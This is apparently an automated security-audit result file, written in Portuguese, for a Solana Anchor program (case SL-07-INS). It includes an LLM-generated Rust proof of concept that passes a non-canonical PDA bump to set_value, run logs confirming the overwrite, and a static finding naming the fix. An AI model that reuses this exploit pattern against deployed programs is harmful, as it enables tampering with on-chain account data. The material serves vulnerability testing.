@@ -1,0 +1,95 @@
+{
+  "category": "PDA",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e dano verificado: value da conta no PDA nao canonico foi alterado",
+  "attempts_used": 1,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2469,
+        "completion_tokens": 821,
+        "latency_s": 4.53
+      },
+      "raw": "{\n  \"plan\": \"Preparar uma conta Data no PDA canonico derivado de [key.to_le_bytes(), bump_canonico] e chamar set_value legitimamente com o bump canonico para provar que o cenario esta correto. Em seguida, atacar chamando set_value com um bump nao canonico que gera um endereco off-curve diferente, passando uma conta Data controlada nesse endereco alternativo. O efeito medido e que o value da conta alternativa foi alterado, demonstrando que o programa aceitou um PDA nao canonico.\",\n  \"scenario\": \"let key: u64 = 42;\\nlet new_value: u64 = 999;\\n\\n// Deriva o PDA canonico\\nlet (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[key.to_le_bytes().as_ref()], &env.program_id);\\n\\n// Conta Data canonica com value inicial 0\\nlet data_account = account(&env.program_id, &anchor_account_data(\\\"Data\\\", &(0u64,)), None);\\n\\n// Baseline: chamada legitima com bump canonico\\nlet ix_baseline = env.anchor_ix(\\\"set_value\\\", &(key, new_value, canonical_bump), vec![\\n    AccountMeta::new(canonical_pda, false),\\n]);\\nlet contas_baseline = vec![\\n    (canonical_pda, data_account.clone()),\\n];\\nlet r_baseline = env.baseline(\\\"set_value legitimo com bump canonico\\\", &ix_baseline, &contas_baseline);\\n\\n// Encontra um bump nao canonico que gera um endereco off-curve valido\\nlet mut non_canonical_bump: Option<u8> = None;\\nlet mut non_canonical_pda: Option<Pubkey> = None;\\nfor b in (0..canonical_bump).rev() {\\n    if let Ok(addr) = Pubkey::create_program_address(&[key.to_le_bytes().as_ref(), &[b]], &env.program_id) {\\n        non_canonical_bump = Some(b);\\n        non_canonical_pda = Some(addr);\\n        break;\\n    }\\n}\\n\\nif let (Some(bump_alt), Some(pda_alt)) = (non_canonical_bump, non_canonical_pda) {\\n    // Conta Data no endereco alternativo, controlada pelo atacante (mesmo dono do programa para passar Account<Data>)\\n    let data_alt = account(&env.program_id, &anchor_account_data(\\\"Data\\\", &(0u64,)), None);\\n\\n    let ix_attack = env.anchor_ix(\\\"set_value\\\", &(key, new_value, bump_alt), vec![\\n        AccountMeta::new(pda_alt, false),\\n    ]);\\n    let contas_attack = vec![\\n        (pda_alt, data_alt),\\n    ];\\n\\n    let r_attack = env.attack(\\\"set_value com bump nao canonico\\\", &ix_attack, &contas_attack);\\n\\n    if r_attack.program_result == ProgramResult::Success {\\n        // Verifica que o value da conta alternativa foi alterado\\n        let data_after = after(&r_attack, &pda_alt);\\n        env.effect(\\\"value da conta no PDA nao canonico foi alterado\\\", read_u64(data_after.data(), 8) == new_value);\\n    }\\n}\"\n}",
+      "plan": "Preparar uma conta Data no PDA canonico derivado de [key.to_le_bytes(), bump_canonico] e chamar set_value legitimamente com o bump canonico para provar que o cenario esta correto. Em seguida, atacar chamando set_value com um bump nao canonico que gera um endereco off-curve diferente, passando uma conta Data controlada nesse endereco alternativo. O efeito medido e que o value da conta alternativa foi alterado, demonstrando que o programa aceitou um PDA nao canonico.",
+      "scenario": "let key: u64 = 42;\nlet new_value: u64 = 999;\n\n// Deriva o PDA canonico\nlet (canonical_pda, canonical_bump) = Pubkey::find_program_address(&[key.to_le_bytes().as_ref()], &env.program_id);\n\n// Conta Data canonica com value inicial 0\nlet data_account = account(&env.program_id, &anchor_account_data(\"Data\", &(0u64,)), None);\n\n// Baseline: chamada legitima com bump canonico\nlet ix_baseline = env.anchor_ix(\"set_value\", &(key, new_value, canonical_bump), vec![\n    AccountMeta::new(canonical_pda, false),\n]);\nlet contas_baseline = vec![\n    (canonical_pda, data_account.clone()),\n];\nlet r_baseline = env.baseline(\"set_value legitimo com bump canonico\", &ix_baseline, &contas_baseline);\n\n// Encontra um bump nao canonico que gera um endereco off-curve valido\nlet mut non_canonical_bump: Option<u8> = None;\nlet mut non_canonical_pda: Option<Pubkey> = None;\nfor b in (0..canonical_bump).rev() {\n    if let Ok(addr) = Pubkey::create_program_address(&[key.to_le_bytes().as_ref(), &[b]], &env.program_id) {\n        non_canonical_bump = Some(b);\n        non_canonical_pda = Some(addr);\n        break;\n    }\n}\n\nif let (Some(bump_alt), Some(pda_alt)) = (non_canonical_bump, non_canonical_pda) {\n    // Conta Data no endereco alternativo, controlada pelo atacante (mesmo dono do programa para passar Account<Data>)\n    let data_alt = account(&env.program_id, &anchor_account_data(\"Data\", &(0u64,)), None);\n\n    let ix_attack = env.anchor_ix(\"set_value\", &(key, new_value, bump_alt), vec![\n        AccountMeta::new(pda_alt, false),\n    ]);\n    let contas_attack = vec![\n        (pda_alt, data_alt),\n    ];\n\n    let r_attack = env.attack(\"set_value com bump nao canonico\", &ix_attack, &contas_attack);\n\n    if r_attack.program_result == ProgramResult::Success {\n        // Verifica que o value da conta alternativa foi alterado\n        let data_after = after(&r_attack, &pda_alt);\n        env.effect(\"value da conta no PDA nao canonico foi alterado\", read_u64(data_after.data(), 8) == new_value);\n    }\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": "1111111QLbz7JHiBTspS962RLKV8GndWFwiEaqKM"
+          },
+          {
+            "step": "baseline",
+            "note": "set_value legitimo com bump canonico",
+            "result": "Success",
+            "compute_units": 2434,
+            "account_flags": "-w",
+            "ix_head": "fdd630c964c9e3db",
+            "accounts": [
+              {
+                "key": "2281yxZaQDcV9WrycQWLt7Qi7NLDZPiHJ2LN82dc2RK7",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 16,
+                "head": "ce9c3bbc124ff0e8",
+                "digest": "4eeb21b1cc63fdbb",
+                "post": "ce9c3bbc124ff0e8e703000000000000"
+              }
+            ]
+          },
+          {
+            "step": "attack",
+            "note": "set_value com bump nao canonico",
+            "result": "Success",
+            "compute_units": 2434,
+            "account_flags": "-w",
+            "ix_head": "fdd630c964c9e3db",
+            "accounts": [
+              {
+                "key": "6udnz5y49re7aenes8f78uUsmt78NRNzL8T3uaw6hq5q",
+                "signer": false,
+                "writable": true,
+                "owner": "Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS",
+                "data_len": 16,
+                "head": "ce9c3bbc124ff0e8",
+                "digest": "4eeb21b1cc63fdbb",
+                "post": "ce9c3bbc124ff0e8e703000000000000"
+              }
+            ]
+          },
+          {
+            "step": "effect",
+            "note": "value da conta no PDA nao canonico foi alterado",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2434 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 2434 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e dano verificado: value da conta no PDA nao canonico foi alterado"
+    }
+  ],
+  "case_id": "SL-07-INS",
+  "static_finding": {
+    "category": "PDA",
+    "confidence": "high",
+    "evidence": "let address = Pubkey::create_program_address(&[key.to_le_bytes().as_ref(), &[bump]], ctx.program_id).map_err(|_| ProgramError::InvalidSeeds)?; if address != ctx.accounts.data.key() { return Err(ProgramError::InvalidArgument.into()); }",
+    "explanation": "O codigo usa `Pubkey::create_program_address` com um `bump` fornecido pelo usuario (argumento `bump: u8`) em vez de derivar o bump canonico com `Pubkey::find_program_address`. Embora compare o endereco resultante com a chave da conta, nao valida se o bump e o canonico; um atacante pode fornecer um bump nao canonico que ainda produza um endereco valido (off-curve) e passe na comparacao, desde que a conta correspondente exista e seja controlada. A mitigacao correta seria usar `find_program_address` ou a constraint `#[account(seeds = [...], bump)]` do Anchor.",
+    "attack_hypothesis": "Um atacante fornece um `bump` nao canonico que gera um endereco off-curve diferente do PDA canonico esperado. Se conseguir criar ou controlar uma conta `Data` nesse endereco alternativo (por exemplo, via uma instrucao de inicializacao que aceite o mesmo bump), pode passar essa conta como `data` e sobrescrever seu `value` sem que o programa detecte que nao e o PDA canonico, contornando a logica de autorizacao baseada em PDA."
+  }
+}
